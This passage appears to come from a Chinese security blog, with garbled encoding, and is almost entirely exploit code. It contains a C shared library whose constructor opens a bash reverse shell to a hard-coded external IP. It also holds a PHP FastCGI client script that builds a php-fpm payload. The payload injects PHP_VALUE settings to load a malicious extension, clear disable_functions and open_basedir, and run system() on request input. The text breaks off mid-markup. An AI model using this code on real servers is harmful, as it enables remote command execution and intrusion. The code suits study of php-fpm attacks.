<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/47.97.123.81/11451 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>ç”Ÿæˆpayloadçš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_sock = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_host = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_port = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_keepAlive = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$host, $port = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = $host;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = $port;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params">$b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)$b;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params">$type, $content, $requestId = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $clen = strlen($content);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr($type)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr(($requestId &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr($requestId &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr(($clen &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr($clen &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . $content;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        <span class="keyword">if</span> ($nlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr($nlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr(($nlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($nlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($nlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($vlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr($vlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr(($vlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($vlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($vlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params">$data, $length = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $array = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> ($length === <span class="literal">null</span>) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($p != $length) &#123;</span><br><span class="line">            $nlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($nlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($vlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = <span class="keyword">array</span>();</span><br><span class="line">        $ret[<span class="string">&#x27;version&#x27;</span>]       = ord($data&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;type&#x27;</span>]          = ord($data&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;requestId&#x27;</span>]     = (ord($data&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord($data&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;contentLength&#x27;</span>] = (ord($data&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord($data&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;paddingLength&#x27;</span>] = ord($data&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;reserved&#x27;</span>]      = ord($data&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($packet = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            $resp = <span class="keyword">$this</span>-&gt;decodePacketHeader($packet);</span><br><span class="line">            $resp[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                $len  = $resp[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> ($len &amp;&amp; $buf=fread(<span class="keyword">$this</span>-&gt;_sock, $len)) &#123;</span><br><span class="line">                    $len -= strlen($buf);</span><br><span class="line">                    $resp[<span class="string">&#x27;content&#x27;</span>] .= $buf;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                $buf=fread(<span class="keyword">$this</span>-&gt;_sock, $resp[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $resp;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> $requestedInfo</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        $request = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($requestedInfo <span class="keyword">as</span> $info) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildNvpair($info, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, $request, <span class="number">0</span>));</span><br><span class="line">        $resp = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> ($resp[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair($resp[<span class="string">&#x27;content&#x27;</span>], $resp[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> $params, $stdin</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        $request = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        $paramsRequest = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= <span class="keyword">$this</span>-&gt;buildNvpair($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($paramsRequest) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, $paramsRequest);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($stdin) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, $stdin);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span>.urlencode($request));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">$filepath = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;    <span class="comment">// ç›®æ ‡ä¸»æœºå·²çŸ¥çš„PHPæ–‡ä»¶çš„è·¯å¾„</span></span><br><span class="line">$req = <span class="string">&#x27;/&#x27;</span>.basename($filepath);</span><br><span class="line">$uri = $req .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;    <span class="comment">// å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡</span></span><br><span class="line">$client = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">$code = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;    <span class="comment">// å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡</span></span><br><span class="line">$php_value = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;</span><br><span class="line">$params = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; $filepath,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; $req,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; $uri,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; $req,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; $php_value,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen($code)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span 